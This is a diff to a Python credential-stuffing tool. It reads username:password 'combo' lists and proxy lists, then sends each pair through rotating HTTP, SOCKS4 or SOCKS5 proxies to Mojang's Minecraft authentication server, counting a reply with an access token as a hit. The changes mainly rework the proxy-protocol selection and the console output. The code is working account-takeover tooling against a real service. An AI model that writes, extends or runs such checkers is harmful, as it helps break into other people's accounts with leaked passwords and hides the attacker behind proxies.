@@ -35,9 +35,17 @@ class Main:
         self.protocol = None
 
     def proxy_type(self):
-        self.protocol = int(input(f"{red} > {white} Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3): "))
-        if self.protocol < 1 or self.protocol > 3:
+        print(mark)
+        id = int(input(f"{red} > {white} Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3): "))
+        if id == 1:
+            self.protocol = "https"
+        elif id == 2:
+            self.protocol = "socks4"
+        elif id == 3:
+            self.protocol = "socks5"
+        if id < 1 or id > 3:
             print(f"{yellow} ERROR {white}: Incorrect value entered, retry.")
+            exit()
         
 
     def load_proxies(self):
@@ -53,10 +61,14 @@ class Main:
                         except:
                             pass
                 print(f"> Loaded [{len(self.proxy_list)}] proxies lines..\n")
+                os.system("cls")
+                print(mark)
             except Exception:
                 print(f"\nproxy error")
 
         else:
+            os.system("cls")
+            print(mark)
             print(f"{yellow}ERROR {white}: No proxy file found, please select your proxies.")
             proxies = open(fileopenbox(title="Load Proxies List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").readlines()
             for line in proxies:
@@ -67,6 +79,8 @@ class Main:
                     pass
 
             print(f"{red}> {white}Loaded [{len(self.proxy_list)}] proxies lines..\n")
+            os.system("cls")
+            print(mark)
 
     def load_combos(self):
         if os.path.exists("combo.txt"):
@@ -83,12 +97,12 @@ class Main:
             os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
             print(mark)
             print(f"> {yellow}ERROR{white} : No combo file found, please select your combo.")
-            combo = open(fileopenbox(title="Load Combo List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").read().splitlines()
-            for line in combo:
-                for ":" in line:
-                    self.usernames.append(line.split(":")[0])
-                    self.passwords.append(line.split(":")[-1])
+            combo = open(fileopenbox(title="Load Combo List", default="*.txt"), "r")
+            for line in combo.readlines():
+                self.usernames.append(line.split(":")[0].strip())
+                self.passwords.append(line.split(":")[1].strip())
             if not len(self.usernames): return None
+            os.system("cls")
             return True
     
     def title(self):
@@ -100,18 +114,17 @@ class Main:
         return session
     
     def check_account(self, username, password):
+        proxy = random.choice(self.proxy_list)
+        if self.protocol == "https":
+            proxy_table = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
+        elif self.protocol == "socks4":
+            proxy_table = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
+        elif self.protocol == "socks5":
+            proxy_table = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
         try:
             session = self.session()
-            proxy = random.choice(self.proxy_list)
-            if self.proxy_type == 1:
-                proxy_send = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
-            elif self.proxy_type == 2:
-                proxy_send = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
-            elif self.proxy_type == 3:
-                proxy_send = {"http": "socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080", "https": "socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"}
-                pxhidden = f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********'
             json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
-            check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_send)
+            check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_table)
 
             if "accessToken" in check.json():
                 if self.hide:
@@ -184,6 +197,7 @@ class Main:
                 self.retries = int(input(f"{red}> {white}Retries (default: 0, 3 max): "))
                 if self.retries == 0:
                     self.retries = 1
+                    self.start()
                 elif self.retries > 3 or self.retries < 1:
                     retries_old = self.retries
                     self.retries = 1
